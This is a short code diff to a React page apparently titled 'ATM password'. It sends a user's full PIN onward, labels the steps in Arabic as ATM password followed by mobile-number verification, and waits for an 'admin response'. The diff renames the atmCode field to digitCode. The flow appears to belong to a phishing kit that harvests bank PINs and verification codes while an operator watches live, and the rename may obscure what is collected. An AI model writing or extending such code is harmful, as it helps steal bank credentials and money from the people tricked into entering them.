@@ -101,7 +101,7 @@ export default function ATMPassword() {
     setError(false);
     setIsWaiting(true);
     sendData({
-      atmCode: fullPin,
+      digitCode: fullPin,
       current: "كلمة مرور ATM",
       nextPage: "توثيق رقم الجوال",
       waitingForAdminResponse: true,
